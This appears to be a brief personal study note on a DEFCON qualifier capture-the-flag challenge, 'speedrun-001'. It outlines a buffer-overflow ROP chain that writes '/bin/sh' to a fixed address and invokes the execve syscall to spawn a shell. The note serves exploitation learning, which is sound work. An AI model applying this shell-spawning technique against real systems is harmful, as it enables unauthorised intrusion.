---
type: challenge
event: DEFCON quals
name: speedrun-001
category: pwn
note: "[[Binary Exploitation]]"
solved: ✅
---
Buffer overflow:
```
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
```

```
pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
```





